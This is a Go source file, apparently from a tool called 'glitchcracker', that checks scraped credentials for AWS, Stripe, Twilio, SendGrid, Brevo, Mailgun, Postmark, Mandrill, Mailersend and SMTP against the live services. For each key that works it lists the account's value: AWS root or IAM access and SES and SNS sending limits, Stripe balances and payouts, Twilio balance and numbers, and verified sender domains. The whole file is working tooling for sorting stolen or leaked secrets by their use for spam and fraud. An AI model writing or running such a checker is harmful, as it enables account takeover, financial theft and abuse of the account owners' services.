package validator

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"glitchcracker/pkg/models"
	"net"
	"net/http"
	"net/smtp"
	"strings"
	"time"

	"github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/credentials"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/aws/aws-sdk-go-v2/service/ses"
	"github.com/aws/aws-sdk-go-v2/service/sns"
	"github.com/aws/aws-sdk-go-v2/service/sts"
)

type ValidationResult struct {
	Valid   bool
	Message string
}

var httpClient = &http.Client{Timeout: 15 * time.Second}

func Validate(res *models.ScrapingResult) ValidationResult {
	if res.AKIA != "" && res.SecretKey != "" { return ValidateAWS(res) }
	if res.StripeSecretKey != "" { return ValidateStripe(res) }
	if res.SendGridApiKey != "" { return ValidateSendGrid(res) }
	if res.BrevoApiKey != "" { return ValidateBrevo(res) }
	if res.XsmtpsibApiKey != "" { return ValidateXSMTP(res) }
	if res.TwilioAccountSid != "" && res.TwilioAuthToken != "" { return ValidateTwilio(res) }
	if res.MailgunApiKey != "" || res.NewMailgunApiKey != "" { return ValidateMailgun(res) }
	if res.PostmarkApiKey != "" { return ValidatePostmark(res) }
	if res.MandrillApiKey != "" { return ValidateMandrill(res) }
	if res.MailersendApiKey != "" { return ValidateMailersend(res) }
	if res.SmtpHost != "" || (res.SmtpUser != "" && res.SmtpPass != "") { return ValidateSMTP(res) }
	return ValidationResult{Valid: false, Message: "No validator implemented"}
}

func Pointer[T any](v T) *T { return &v }

func initCreds(res *models.ScrapingResult) {
	if res.Credentials == nil {
		res.Credentials = make(map[string]interface{})
	}
}

// ── AWS ──────────────────────────────────────

func ValidateAWS(res *models.ScrapingResult) ValidationResult {
	ctx, cancel := context.WithTimeout(context.Background(), 45*time.Second)
	defer cancel()
	var lastErr error
	for _, region := range []string{"us-east-1", "us-west-2", "eu-west-1", "ap-southeast-1"} {
		staticCreds := credentials.NewStaticCredentialsProvider(res.AKIA, res.SecretKey, "")
		cfg, err := config.LoadDefaultConfig(ctx, config.WithCredentialsProvider(staticCreds), config.WithRegion(region))
		if err != nil { lastErr = err; continue }
		stsClient := sts.NewFromConfig(cfg)
		identity, err := stsClient.GetCallerIdentity(ctx, &sts.GetCallerIdentityInput{})
		if err != nil { lastErr = err; continue }
		res.AwsStatus = "Valid"
		if strings.HasSuffix(*identity.Arn, ":root") { res.AwsStatus = "ROOT ACCESS" }
		initCreds(res)
		res.Credentials["ARN"] = *identity.Arn
		res.Credentials["AccountID"] = *identity.Account
		sesClient := ses.NewFromConfig(cfg)
		if quota, err := sesClient.GetSendQuota(ctx, &ses.GetSendQuotaInput{}); err == nil {
			res.AwsSesQuota = fmt.Sprintf("Max24h=%.0f Sent24h=%.0f Rate=%.0f/s", quota.Max24HourSend, quota.SentLast24Hours, quota.MaxSendRate)
		} else { res.AwsSesQuota = "No Access" }
		snsClient := sns.NewFromConfig(cfg)
		if attrs, err := snsClient.GetSMSAttributes(ctx, &sns.GetSMSAttributesInput{}); err == nil {
			limit := attrs.Attributes["MonthlySpendLimit"]; spent := attrs.Attributes["MonthlySpend"]
			if limit == "" { limit = "N/A" }; if spent == "" { spent = "N/A" }
			res.AwsSnsLimit = fmt.Sprintf("Limit=$%s Spent=$%s", limit, spent)
		} else { res.AwsSnsLimit = "No Access" }
		iamClient := iam.NewFromConfig(cfg)
		var perms []string
		if _, err := iamClient.ListUsers(ctx, &iam.ListUsersInput{}); err == nil { perms = append(perms, "iam:ListUsers") }
		if _, err := iamClient.ListRoles(ctx, &iam.ListRolesInput{}); err == nil { perms = append(perms, "iam:ListRoles") }
		if len(perms) == 0 { res.AwsPermissions = "Limited" } else { res.AwsPermissions = strings.Join(perms, ", ") }
		return ValidationResult{Valid: true, Message: fmt.Sprintf("AWS OK [%s] %s | SES: %s | SNS: %s | IAM: %s", region, res.AwsStatus, res.AwsSesQuota, res.AwsSnsLimit, res.AwsPermissions)}
	}
	return ValidationResult{Valid: false, Message: "AWS Invalid: " + lastErr.Error()}
}

// ── TWILIO ───────────────────────────────────

func ValidateTwilio(res *models.ScrapingResult) ValidationResult {
	doReq := func(url string) (*http.Response, error) {
		req, _ := http.NewRequest("GET", url, nil)
		req.SetBasicAuth(res.TwilioAccountSid, res.TwilioAuthToken)
		return httpClient.Do(req)
	}
	resp, err := doReq(fmt.Sprintf("https://api.twilio.com/2010-04-01/Accounts/%s.json", res.TwilioAccountSid))
	if err != nil { return ValidationResult{Valid: false, Message: "Twilio API Error: " + err.Error()} }
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK { return ValidationResult{Valid: false, Message: fmt.Sprintf("Twilio Invalid (HTTP %d)", resp.StatusCode)} }
	var acc struct {
		FriendlyName string `json:"friendly_name"`
		Status       string `json:"status"`
		Type         string `json:"type"`
	}
	json.NewDecoder(resp.Body).Decode(&acc)
	initCreds(res)
	res.Credentials["Name"] = acc.FriendlyName
	res.Credentials["Status"] = acc.Status
	res.Credentials["Type"] = acc.Type
	if r2, err := doReq(fmt.Sprintf("https://api.twilio.com/2010-04-01/Accounts/%s/Balance.json", res.TwilioAccountSid)); err == nil && r2.StatusCode == 200 {
		var bal struct{ Balance string `json:"balance"`; Currency string `json:"currency"` }
		json.NewDecoder(r2.Body).Decode(&bal); r2.Body.Close()
		res.TwilioBalance = fmt.Sprintf("%s %s", bal.Balance, bal.Currency)
	}
	if r3, err := doReq(fmt.Sprintf("https://api.twilio.com/2010-04-01/Accounts/%s/IncomingPhoneNumbers.json", res.TwilioAccountSid)); err == nil && r3.StatusCode == 200 {
		var nums struct{ IncomingPhoneNumbers []struct{ PhoneNumber string `json:"phone_number"` } `json:"incoming_phone_numbers"` }
		json.NewDecoder(r3.Body).Decode(&nums); r3.Body.Close()
		res.TwilioNumbersCount = len(nums.IncomingPhoneNumbers)
		phones := []string{}
		for _, n := range nums.IncomingPhoneNumbers { phones = append(phones, n.PhoneNumber) }
		if len(phones) > 0 { res.Credentials["PhoneNumbers"] = strings.Join(phones, ", ") }
	}
	return ValidationResult{Valid: true, Message: fmt.Sprintf("Twilio OK | Name: %s | Status: %s | Type: %s | Balance: %s | Numbers: %d", acc.FriendlyName, acc.Status, acc.Type, res.TwilioBalance, res.TwilioNumbersCount)}
}

// ── SENDGRID ─────────────────────────────────

func ValidateSendGrid(res *models.ScrapingResult) ValidationResult {
	doReq := func(url string) (*http.Response, error) {
		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("Authorization", "Bearer "+res.SendGridApiKey)
		return httpClient.Do(req)
	}
	resp, err := doReq("https://api.sendgrid.com/v3/user/credits")
	if err != nil { return ValidationResult{Valid: false, Message: err.Error()} }
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK { return ValidationResult{Valid: false, Message: fmt.Sprintf("SendGrid HTTP %d", resp.StatusCode)} }
	var credits struct{ Remain int `json:"remain"`; Total int `json:"total"`; Used int `json:"used"` }
	json.NewDecoder(resp.Body).Decode(&credits)
	res.SendGridStatus = "VALID"
	res.SendGridQuota = fmt.Sprintf("%d/%d", credits.Remain, credits.Total)
	res.SendGridUsed = credits.Used
	initCreds(res)
	if r2, err := doReq("https://api.sendgrid.com/v3/user/email"); err == nil && r2.StatusCode == 200 {
		var e struct{ Email string `json:"email"` }
		json.NewDecoder(r2.Body).Decode(&e); r2.Body.Close()
		res.SendGridEmail = e.Email
	}
	if r3, err := doReq("https://api.sendgrid.com/v3/user/profile"); err == nil && r3.StatusCode == 200 {
		var p struct{ FirstName string `json:"first_name"`; LastName string `json:"last_name"`; Company string `json:"company"`; Country string `json:"country"` }
		json.NewDecoder(r3.Body).Decode(&p); r3.Body.Close()
		if p.FirstName != "" || p.LastName != "" { res.Credentials["Name"] = p.FirstName + " " + p.LastName }
		if p.Company != "" { res.Credentials["Company"] = p.Company }
		if p.Country != "" { res.Credentials["Country"] = p.Country }
	}
	if r4, err := doReq("https://api.sendgrid.com/v3/user/account"); err == nil && r4.StatusCode == 200 {
		var a struct{ Type string `json:"type"` }
		json.NewDecoder(r4.Body).Decode(&a); r4.Body.Close()
		if a.Type != "" { res.Credentials["Plan"] = a.Type }
	}
	if r5, err := doReq("https://api.sendgrid.com/v3/verified_senders"); err == nil && r5.StatusCode == 200 {
		var s struct{ Results []struct{ FromEmail string `json:"from_email"`; Verified bool `json:"verified"` } `json:"results"` }
		json.NewDecoder(r5.Body).Decode(&s); r5.Body.Close()
		senders := []string{}
		for _, sr := range s.Results { if sr.Verified { senders = append(senders, sr.FromEmail) } }
		if len(senders) > 0 { res.Credentials["VerifiedSenders"] = strings.Join(senders, ", ") }
	}
	if r6, err := doReq("https://api.sendgrid.com/v3/whitelabel/domains"); err == nil && r6.StatusCode == 200 {
		var domains []struct{ Domain string `json:"domain"`; Valid bool `json:"valid"` }
		json.NewDecoder(r6.Body).Decode(&domains); r6.Body.Close()
		domList := []string{}
		for _, d := range domains { if d.Valid { domList = append(domList, d.Domain) } }
		if len(domList) > 0 { res.Credentials["AuthDomains"] = strings.Join(domList, ", ") }
	}
	return ValidationResult{Valid: true, Message: fmt.Sprintf("SendGrid OK | Email: %s | Credits: %s | Used: %d", res.SendGridEmail, res.SendGridQuota, res.SendGridUsed)}
}

// ── BREVO ────────────────────────────────────

func ValidateBrevo(res *models.ScrapingResult) ValidationResult {
	doReq := func(url string) (*http.Response, error) {
		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("api-key", res.BrevoApiKey)
		req.Header.Set("accept", "application/json")
		return httpClient.Do(req)
	}
	resp, err := doReq("https://api.brevo.com/v3/account")
	if err != nil { return ValidationResult{Valid: false, Message: err.Error()} }
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK { return ValidationResult{Valid: false, Message: fmt.Sprintf("Brevo HTTP %d", resp.StatusCode)} }
	var data struct {
		Email string `json:"email"`; FirstName string `json:"firstName"`; LastName string `json:"lastName"`
		CompanyName string `json:"companyName"`
		Address struct{ Country string `json:"country"` } `json:"address"`
		Plan []struct{ Type string `json:"type"`; Credits int `json:"credits"`; EndDate string `json:"endDate"` } `json:"plan"`
	}
	json.NewDecoder(resp.Body).Decode(&data)
	res.BrevoSender = data.Email
	initCreds(res)
	if data.FirstName != "" || data.LastName != "" { res.Credentials["Name"] = data.FirstName + " " + data.LastName }
	if data.CompanyName != "" { res.Credentials["Company"] = data.CompanyName }
	if data.Address.Country != "" { res.Credentials["Country"] = data.Address.Country }
	emailCredits, smsCredits := 0, 0
	for _, p := range data.Plan {
		if strings.Contains(p.Type, "payAsYouGo") || strings.Contains(p.Type, "subscription") {
			res.BrevoEmailCredits = p.Credits; emailCredits = p.Credits
			if p.EndDate != "" { res.Credentials["PlanExpiry"] = p.EndDate }
		} else if strings.Contains(p.Type, "sms") { res.BrevoSmsCredits = p.Credits; smsCredits = p.Credits }
	}
	if r2, err := doReq("https://api.brevo.com/v3/senders"); err == nil && r2.StatusCode == 200 {
		var s struct{ Senders []struct{ Email string `json:"email"`; Active bool `json:"active"` } `json:"senders"` }
		json.NewDecoder(r2.Body).Decode(&s); r2.Body.Close()
		senders := []string{}
		for _, sr := range s.Senders { if sr.Active { senders = append(senders, sr.Email) } }
		if len(senders) > 0 { res.Credentials["Senders"] = strings.Join(senders, ", ") }
	}
	if r3, err := doReq("https://api.brevo.com/v3/domains"); err == nil && r3.StatusCode == 200 {
		var d struct{ Domains []struct{ DomainName string `json:"domain_name"`; Verified bool `json:"verified"` } `json:"domains"` }
		json.NewDecoder(r3.Body).Decode(&d); r3.Body.Close()
		domains := []string{}
		for _, dom := range d.Domains { if dom.Verified { domains = append(domains, dom.DomainName) } }
		if len(domains) > 0 { res.Credentials["Domains"] = strings.Join(domains, ", ") }
	}
	return ValidationResult{Valid: true, Message: fmt.Sprintf("Brevo OK | Email: %s | EmailCredits: %d | SMSCredits: %d", data.Email, emailCredits, smsCredits)}
}

// ── STRIPE ───────────────────────────────────

func ValidateStripe(res *models.ScrapingResult) ValidationResult {
	doReq := func(url string) (*http.Response, error) {
		req, _ := http.NewRequest("GET", url, nil)
		req.SetBasicAuth(res.StripeSecretKey, "")
		return httpClient.Do(req)
	}
	resp, err := doReq("https://api.stripe.com/v1/balance")
	if err != nil { return ValidationResult{Valid: false, Message: err.Error()} }
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK { return ValidationResult{Valid: false, Message: fmt.Sprintf("Stripe HTTP %d", resp.StatusCode)} }
	var balance struct {
		Available []struct{ Amount int `json:"amount"`; Currency string `json:"currency"` } `json:"available"`
		Pending   []struct{ Amount int `json:"amount"`; Currency string `json:"currency"` } `json:"pending"`
	}
	json.NewDecoder(resp.Body).Decode(&balance)
	if len(balance.Available) > 0 { res.StripeBalance = fmt.Sprintf("%d %s", balance.Available[0].Amount, strings.ToUpper(balance.Available[0].Currency)) }
	initCreds(res)
	if len(balance.Pending) > 0 { res.Credentials["PendingBalance"] = fmt.Sprintf("%d %s", balance.Pending[0].Amount, strings.ToUpper(balance.Pending[0].Currency)) }
	if r2, err := doReq("https://api.stripe.com/v1/account"); err == nil && r2.StatusCode == 200 {
		var acc struct {
			Email string `json:"email"`; Country string `json:"country"`; DefaultCurrency string `json:"default_currency"`
			BusinessType string `json:"business_type"`; ChargesEnabled bool `json:"charges_enabled"`; PayoutsEnabled bool `json:"payouts_enabled"`
			Settings struct{ Dashboard struct{ DisplayName string `json:"display_name"` } `json:"dashboard"` } `json:"settings"`
			BusinessProfile struct{ Name string `json:"name"`; URL string `json:"url"` } `json:"business_profile"`
		}
		json.NewDecoder(r2.Body).Decode(&acc); r2.Body.Close()
		res.StripeBusinessName = acc.Settings.Dashboard.DisplayName
		if res.StripeBusinessName == "" { res.StripeBusinessName = acc.BusinessProfile.Name }
		if acc.Email != "" { res.Credentials["Email"] = acc.Email }
		if acc.Country != "" { res.Credentials["Country"] = acc.Country }
		if acc.DefaultCurrency != "" { res.Credentials["Currency"] = strings.ToUpper(acc.DefaultCurrency) }
		if acc.BusinessType != "" { res.Credentials["BusinessType"] = acc.BusinessType }
		res.Credentials["ChargesEnabled"] = fmt.Sprintf("%v", acc.ChargesEnabled)
		res.Credentials["PayoutsEnabled"] = fmt.Sprintf("%v", acc.PayoutsEnabled)
		if acc.BusinessProfile.URL != "" { res.Credentials["Website"] = acc.BusinessProfile.URL }
	}
	if r3, err := doReq("https://api.stripe.com/v1/customers?limit=1"); err == nil && r3.StatusCode == 200 {
		var c struct{ TotalCount int `json:"total_count"` }
		json.NewDecoder(r3.Body).Decode(&c); r3.Body.Close()
		res.Credentials["Customers"] = fmt.Sprintf("%d", c.TotalCount)
	}
	return ValidationResult{Valid: true, Message: fmt.Sprintf("Stripe OK | Balance: %s | Business: %s", res.StripeBalance, res.StripeBusinessName)}
}

// ── MAILGUN ──────────────────────────────────

func ValidateMailgun(res *models.ScrapingResult) ValidationResult {
	key := res.MailgunApiKey; if key == "" { key = res.NewMailgunApiKey }
	doReq := func(url string) (*http.Response, error) {
		req, _ := http.NewRequest("GET", url, nil)
		req.SetBasicAuth("api", key)
		return httpClient.Do(req)
	}
	resp, err := doReq("https://api.mailgun.net/v3/domains")
	if err != nil { return ValidationResult{Valid: false, Message: err.Error()} }
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK { return ValidationResult{Valid: false, Message: fmt.Sprintf("Mailgun HTTP %d", resp.StatusCode)} }
	var data struct {
		Items []struct{ Name string `json:"name"`; State string `json:"state"` } `json:"items"`
		TotalCount int `json:"total_count"`
	}
	json.NewDecoder(resp.Body).Decode(&data)
	initCreds(res)
	domList := []string{}
	for _, d := range data.Items { domList = append(domList, fmt.Sprintf("%s (%s)", d.Name, d.State)) }
	if len(domList) > 0 { res.Credentials["Domains"] = strings.Join(domList, ", ") }
	if len(data.Items) > 0 {
		if r2, err := doReq(fmt.Sprintf("https://api.mailgun.net/v3/%s/stats/total?event=sent&duration=1m", data.Items[0].Name)); err == nil && r2.StatusCode == 200 {
			var stats struct{ Stats []struct{ Total struct{ Count int `json:"count"` } `json:"total"` } `json:"stats"` }
			json.NewDecoder(r2.Body).Decode(&stats); r2.Body.Close()
			if len(stats.Stats) > 0 { res.Credentials["SentLastMonth"] = fmt.Sprintf("%d", stats.Stats[0].Total.Count) }
		}
	}
	return ValidationResult{Valid: true, Message: fmt.Sprintf("Mailgun OK | Domains: %d", data.TotalCount)}
}

// ── POSTMARK ─────────────────────────────────

func ValidatePostmark(res *models.ScrapingResult) ValidationResult {
	doReq := func(url string) (*http.Response, error) {
		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("X-Postmark-Account-Token", res.PostmarkApiKey)
		req.Header.Set("Accept", "application/json")
		return httpClient.Do(req)
	}
	resp, err := doReq("https://api.postmarkapp.com/servers?count=5&offset=0")
	if err != nil { return ValidationResult{Valid: false, Message: err.Error()} }
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK { return ValidationResult{Valid: false, Message: fmt.Sprintf("Postmark HTTP %d", resp.StatusCode)} }
	var data struct {
		TotalCount int `json:"TotalCount"`
		Servers []struct{ Name string `json:"Name"` } `json:"Servers"`
	}
	json.NewDecoder(resp.Body).Decode(&data)
	initCreds(res)
	res.Credentials["Servers"] = fmt.Sprintf("%d", data.TotalCount)
	names := []string{}; for _, s := range data.Servers { names = append(names, s.Name) }
	if len(names) > 0 { res.Credentials["ServerNames"] = strings.Join(names, ", ") }
	if r2, err := doReq("https://api.postmarkapp.com/senders?count=10&offset=0"); err == nil && r2.StatusCode == 200 {
		var senders struct{ SenderSignatures []struct{ EmailAddress string `json:"EmailAddress"`; Confirmed bool `json:"Confirmed"` } `json:"SenderSignatures"` }
		json.NewDecoder(r2.Body).Decode(&senders); r2.Body.Close()
		emails := []string{}
		for _, s := range senders.SenderSignatures { if s.Confirmed { emails = append(emails, s.EmailAddress) } }
		if len(emails) > 0 { res.Credentials["SenderEmails"] = strings.Join(emails, ", ") }
	}
	return ValidationResult{Valid: true, Message: fmt.Sprintf("Postmark OK | Servers: %d", data.TotalCount)}
}

// ── MANDRILL ─────────────────────────────────

func ValidateMandrill(res *models.ScrapingResult) ValidationResult {
	doPost := func(url string) (*http.Response, error) {
		req, _ := http.NewRequest("POST", url, strings.NewReader(fmt.Sprintf(`{"key":"%s"}`, res.MandrillApiKey)))
		req.Header.Set("Content-Type", "application/json")
		return httpClient.Do(req)
	}
	resp, err := doPost("https://mandrillapp.com/api/1.0/users/info.json")
	if err != nil { return ValidationResult{Valid: false, Message: err.Error()} }
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK { return ValidationResult{Valid: false, Message: fmt.Sprintf("Mandrill HTTP %d", resp.StatusCode)} }
	var data struct {
		Username string `json:"username"`; Reputation int `json:"reputation"`; HourlyQuota int `json:"hourly_quota"`
		Stats struct {
			Today struct{ Sent int `json:"sent"` } `json:"today"`
			Last30Days struct{ Sent int `json:"sent"` } `json:"last_30_days"`
			AllTime struct{ Sent int `json:"sent"` } `json:"all_time"`
		} `json:"stats"`
	}
	json.NewDecoder(resp.Body).Decode(&data)
	initCreds(res)
	res.Credentials["Username"] = data.Username
	res.Credentials["Reputation"] = fmt.Sprintf("%d/100", data.Reputation)
	res.Credentials["HourlyQuota"] = fmt.Sprintf("%d", data.HourlyQuota)
	res.Credentials["SentToday"] = fmt.Sprintf("%d", data.Stats.Today.Sent)
	res.Credentials["SentLast30Days"] = fmt.Sprintf("%d", data.Stats.Last30Days.Sent)
	res.Credentials["SentAllTime"] = fmt.Sprintf("%d", data.Stats.AllTime.Sent)
	if r2, err := doPost("https://mandrillapp.com/api/1.0/senders/list.json"); err == nil && r2.StatusCode == 200 {
		var senders []struct{ Address string `json:"address"` }
		json.NewDecoder(r2.Body).Decode(&senders); r2.Body.Close()
		addrs := []string{}; for _, s := range senders { addrs = append(addrs, s.Address) }
		if len(addrs) > 0 { res.Credentials["Senders"] = strings.Join(addrs, ", ") }
	}
	return ValidationResult{Valid: true, Message: fmt.Sprintf("Mandrill OK | User: %s | Reputation: %d | Sent: %d | Quota/h: %d", data.Username, data.Reputation, data.Stats.AllTime.Sent, data.HourlyQuota)}
}

// ── MAILERSEND ───────────────────────────────

func ValidateMailersend(res *models.ScrapingResult) ValidationResult {
	doReq := func(url string) (*http.Response, error) {
		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("Authorization", "Bearer "+res.MailersendApiKey)
		req.Header.Set("Content-Type", "application/json")
		return httpClient.Do(req)
	}
	resp, err := doReq("https://api.mailersend.com/v1/me")
	if err != nil { return ValidationResult{Valid: false, Message: err.Error()} }
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK { return ValidationResult{Valid: false, Message: fmt.Sprintf("Mailersend HTTP %d", resp.StatusCode)} }
	var data struct {
		Data struct {
			Email string `json:"email"`; Name string `json:"name"`; Role string `json:"role"`
			Credits struct{ Used int `json:"used"`; Available int `json:"available"` } `json:"credits"`
		} `json:"data"`
	}
	json.NewDecoder(resp.Body).Decode(&data)
	initCreds(res)
	if data.Data.Name != "" { res.Credentials["Name"] = data.Data.Name }
	if data.Data.Role != "" { res.Credentials["Role"] = data.Data.Role }
	if r2, err := doReq("https://api.mailersend.com/v1/domains"); err == nil && r2.StatusCode == 200 {
		var domains struct{ Data []struct{ Name string `json:"name"`; Active bool `json:"active"` } `json:"data"` }
		json.NewDecoder(r2.Body).Decode(&domains); r2.Body.Close()
		domList := []string{}; for _, d := range domains.Data { if d.Active { domList = append(domList, d.Name) } }
		if len(domList) > 0 { res.Credentials["Domains"] = strings.Join(domList, ", ") }
	}
	if r3, err := doReq("https://api.mailersend.com/v1/templates"); err == nil && r3.StatusCode == 200 {
		var t struct{ Data []struct{ Name string `json:"name"` } `json:"data"` }
		json.NewDecoder(r3.Body).Decode(&t); r3.Body.Close()
		res.Credentials["Templates"] = fmt.Sprintf("%d", len(t.Data))
	}
	total := data.Data.Credits.Used + data.Data.Credits.Available
	return ValidationResult{Valid: true, Message: fmt.Sprintf("Mailersend OK | Email: %s | Credits: %d/%d", data.Data.Email, data.Data.Credits.Available, total)}
}

// ── XSMTP ────────────────────────────────────

func ValidateXSMTP(res *models.ScrapingResult) ValidationResult {
	req, _ := http.NewRequest("GET", "https://api.brevo.com/v3/account", nil)
	req.Header.Set("api-key", res.XsmtpsibApiKey)
	req.Header.Set("accept", "application/json")
	resp, err := httpClient.Do(req)
	if err != nil { return ValidationResult{Valid: false, Message: err.Error()} }
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK { return ValidationResult{Valid: false, Message: fmt.Sprintf("XSMTP HTTP %d", resp.StatusCode)} }
	var data struct {
		Email string `json:"email"`; FirstName string `json:"firstName"`; LastName string `json:"lastName"`
		Plan []struct{ Type string `json:"type"`; Credits int `json:"credits"` } `json:"plan"`
	}
	json.NewDecoder(resp.Body).Decode(&data)
	res.BrevoSender = data.Email
	initCreds(res)
	if data.FirstName != "" || data.LastName != "" { res.Credentials["Name"] = data.FirstName + " " + data.LastName }
	emailCredits, smsCredits := 0, 0
	for _, p := range data.Plan {
		if strings.Contains(p.Type, "payAsYouGo") || strings.Contains(p.Type, "subscription") { emailCredits = p.Credits
		} else if strings.Contains(p.Type, "sms") { smsCredits = p.Credits }
	}
	return ValidationResult{Valid: true, Message: fmt.Sprintf("XSMTP/Brevo OK | Account: %s | EmailCredits: %d | SMSCredits: %d", data.Email, emailCredits, smsCredits)}
}

// ── SMTP ─────────────────────────────────────

func ValidateSMTP(res *models.ScrapingResult) ValidationResult {
	if res.SmtpUser == "" || res.SmtpPass == "" { return ValidationResult{Valid: false, Message: "SMTP Failed: No username or password provided"} }
	host := res.SmtpHost
	if strings.Contains(host, ":") { host, _, _ = net.SplitHostPort(host) }
	tlsConfig := &tls.Config{InsecureSkipVerify: true, ServerName: host}
	var lastErr error
	for _, port := range []string{"587", "465", "25"} {
		addr := host + ":" + port
		auth := smtp.PlainAuth("", res.SmtpUser, res.SmtpPass, host)
		var smtpClient *smtp.Client
		var err error
		if port == "465" {
			conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 5 * time.Second}, "tcp", addr, tlsConfig)
			if err != nil { lastErr = err; continue }
			smtpClient, err = smtp.NewClient(conn, host)
			if err != nil { lastErr = err; continue }
		} else {
			conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
			if err != nil { lastErr = err; continue }
			smtpClient, err = smtp.NewClient(conn, host)
			if err != nil { lastErr = err; continue }
			if ok, _ := smtpClient.Extension("STARTTLS"); ok {
				if err = smtpClient.StartTLS(tlsConfig); err != nil { lastErr = err; smtpClient.Close(); continue }
			}
		}
		if err = smtpClient.Auth(auth); err != nil { smtpClient.Close(); return ValidationResult{Valid: false, Message: "SMTP Auth Failed: " + err.Error()} }
		initCreds(res)
		exts := []string{}
		for _, ext := range []string{"STARTTLS", "AUTH", "SIZE", "8BITMIME", "PIPELINING"} {
			if ok, param := smtpClient.Extension(ext); ok {
				if param != "" { exts = append(exts, ext+"="+param) } else { exts = append(exts, ext) }
			}
		}
		if len(exts) > 0 { res.Credentials["Extensions"] = strings.Join(exts, ", ") }
		smtpClient.Quit()
		return ValidationResult{Valid: true, Message: fmt.Sprintf("SMTP OK | Host: %s | Port: %s | User: %s", host, port, res.SmtpUser)}
	}
	if lastErr != nil { return ValidationResult{Valid: false, Message: "SMTP Failed: " + lastErr.Error()} }
	return ValidationResult{Valid: false, Message: "SMTP Connection Failed (All ports timed out)"}
}
